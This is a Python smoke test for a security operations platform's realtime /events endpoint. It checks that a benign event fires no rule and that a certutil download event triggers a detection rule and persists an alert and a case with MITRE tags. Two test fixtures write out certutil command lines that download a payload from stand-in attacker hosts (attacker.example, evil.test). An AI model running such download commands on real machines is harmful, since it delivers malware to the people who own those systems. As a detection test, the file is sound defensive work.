"""Smoke test for the realtime detection endpoint POST /events.

Validates that the new /events endpoint (Theme 1: t1-detection-engine)
wires raw events all the way through:

  raw event  →  DetectionEngine.evaluate()  →  Hit
              →  Alert + Case persisted
              →  populate_from_alert()
              →  orchestrator scheduled as background task

We exercise three paths:

  1. An event matching a known rule fires at least one Hit, persists
     an Alert + Case, and returns the rule_id list.
  2. An event matching nothing returns zero hits without touching the
     DB. This is the hot path: 99% of EDR telemetry is benign.
  3. A second request fires again — proving the engine is reused as a
     singleton across requests (no cold-start cost after warmup).

Run with:

    cd platform/backend
    PYTHONPATH=. python tests/_check_events_endpoint.py
"""

from __future__ import annotations

import os
import sys
from pathlib import Path

# Ensure the FastAPI app boots in dev-anon mode so we can call /events
# without minting JWTs in the test. The default is true; we set it
# explicitly so a poisoned environment doesn't break the smoke test.
os.environ.setdefault("AISOC_DEV_ALLOW_ANON_TENANT", "true")
os.environ.setdefault("AISOC_SEED_ON_STARTUP", "false")

# Use an isolated SQLite DB per test run so we don't clobber the dev
# DB and our row counts are deterministic. The Settings class reads
# `AISOC_DB_PATH` (not `AISOC_DATABASE_URL`) and builds a
# `sqlite:///{db_path}` URL itself.
_TMP_DB = Path(__file__).parent / "_smoke_events.sqlite"
if _TMP_DB.exists():
    _TMP_DB.unlink()
os.environ["AISOC_DB_PATH"] = str(_TMP_DB)

sys.path.insert(0, str(Path(__file__).parent.parent))

from fastapi.testclient import TestClient  # noqa: E402

from app.api import routes as _routes  # noqa: E402


# Replace the orchestrator background task with a no-op. The orchestrator
# spins up the full per-case agent graph (LLM calls, tool dispatch, HITL
# polling) which is out of scope for this smoke test and would hang the
# TestClient waiting on real I/O. The /events endpoint's contract is
# "detect → persist → schedule"; this test asserts the first two and that
# scheduling happened, not that the agents actually finished.
async def _noop_orchestrator(case_id: int, tenant_id: str) -> None:  # noqa: ARG001
    return None


_routes._run_orchestrator = _noop_orchestrator  # type: ignore[attr-defined]

from app.main import app  # noqa: E402
from app.db import get_session  # noqa: E402
from app.models.alert import Alert  # noqa: E402
from app.models.case import Case  # noqa: E402
from sqlmodel import select  # noqa: E402


def _assert(cond: bool, msg: str) -> None:
    if not cond:
        print(f"  FAIL: {msg}")
        sys.exit(1)
    print(f"  ok:   {msg}")


def main() -> int:
    print("=" * 70)
    print("smoke test: POST /events end-to-end")
    print("=" * 70)

    with TestClient(app) as client:
        # ── 1. Benign event — no rule should fire ────────────────────────
        print("\n[1] benign event should produce zero hits")
        r = client.post(
            "/events",
            json={
                "source": "edr",
                "event": {
                    "process": {
                        "name": "C:\\Program Files\\notepad.exe",
                        "command_line": "notepad.exe README.txt",
                    },
                    "user": {"name": "alice"},
                },
            },
        )
        _assert(r.status_code == 200, f"benign event returns 200 (got {r.status_code}: {r.text[:200]})")
        body = r.json()
        _assert(body["hits"] == 0, f"hits == 0 (got {body['hits']})")
        _assert(body["case_ids"] == [], "case_ids is empty for benign event")

        # ── 2. Malicious event — certutil LOLBin download ────────────────
        # Matches rule aisoc-id-ep-0028-certutil-download. The rule
        # requires (selection AND download) where selection matches
        # process.name endswith '\certutil.exe' and download matches
        # command_line containing '-urlcache' or 'http://'.
        print("\n[2] certutil LOLBin event should fire a rule and create a case")
        r = client.post(
            "/events",
            json={
                "source": "windows-edr",
                "external_id": "evt-smoke-0001",
                "event": {
                    "process": {
                        "name": "C:\\Windows\\System32\\certutil.exe",
                        "command_line": "certutil.exe -urlcache -split -f http://attacker.example/x.exe x.exe",
                    },
                    "user": {"name": "victim"},
                    "host": {"name": "WIN-VICTIM-01"},
                },
            },
        )
        _assert(r.status_code == 200, f"malicious event returns 200 (got {r.status_code}: {r.text[:200]})")
        body = r.json()
        _assert(body["hits"] >= 1, f"hits >= 1 (got {body['hits']})")
        _assert(len(body["case_ids"]) == body["hits"], "one case per hit")
        _assert(len(body["alert_ids"]) == body["hits"], "one alert per hit")
        _assert(
            "aisoc-id-ep-0028-certutil-download" in body["rules_fired"],
            f"certutil rule fired (rules: {body['rules_fired']})",
        )
        first_case_id = body["case_ids"][0]
        first_alert_id = body["alert_ids"][0]

        # ── 3. Verify DB persistence ─────────────────────────────────────
        print("\n[3] verify Alert + Case rows persisted with MITRE tags")
        with next(get_session()) as session:
            case = session.get(Case, first_case_id)
            alert = session.get(Alert, first_alert_id)
            _assert(case is not None, f"case_id={first_case_id} exists in DB")
            _assert(alert is not None, f"alert_id={first_alert_id} exists in DB")
            assert case is not None  # for type checker
            assert alert is not None
            _assert(alert.case_id == case.id, "alert.case_id wired to case")
            _assert(alert.detection_rule == "aisoc-id-ep-0028-certutil-download",
                    f"alert.detection_rule set (got {alert.detection_rule!r})")
            _assert(alert.severity == "high", f"alert.severity == 'high' (got {alert.severity!r})")
            _assert(
                "t1105" in alert.mitre_techniques or "T1105" in alert.mitre_techniques,
                f"MITRE technique t1105 extracted (got {alert.mitre_techniques})",
            )
            _assert(
                any(t == "command_and_control" or t == "command-and-control"
                    for t in alert.mitre_tactics),
                f"MITRE tactic command_and_control extracted (got {alert.mitre_tactics})",
            )
            _assert(alert.external_id == "evt-smoke-0001",
                    f"alert.external_id preserved (got {alert.external_id!r})")

            # Confirm only one alert + one case were created for the
            # malicious request (i.e. we didn't double-fan-out).
            all_alerts = list(session.exec(select(Alert)).all())
            all_cases = list(session.exec(select(Case)).all())
            _assert(len(all_alerts) == body["hits"], f"exactly {body['hits']} alert row(s) in DB")
            _assert(len(all_cases) == body["hits"], f"exactly {body['hits']} case row(s) in DB")

        # ── 4. Engine singleton — second request reuses warm engine ──────
        print("\n[4] second request reuses warm engine (no recompile)")
        r = client.post(
            "/events",
            json={
                "source": "windows-edr",
                "event": {
                    "process": {
                        "name": "C:\\Windows\\System32\\certutil.exe",
                        "command_line": "certutil -urlcache https://evil.test/payload",
                    },
                },
            },
        )
        _assert(r.status_code == 200, f"second event returns 200 (got {r.status_code})")
        body2 = r.json()
        _assert(body2["hits"] >= 1, "second event also fires")
        _assert(
            "aisoc-id-ep-0028-certutil-download" in body2["rules_fired"],
            "second event fires same rule",
        )

    print("\n" + "=" * 70)
    print("PASS — /events endpoint wires raw events → DetectionEngine → Alert + Case")
    print("=" * 70)
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    finally:
        # Clean up the throwaway DB so we don't leave artifacts behind.
        if _TMP_DB.exists():
            _TMP_DB.unlink()
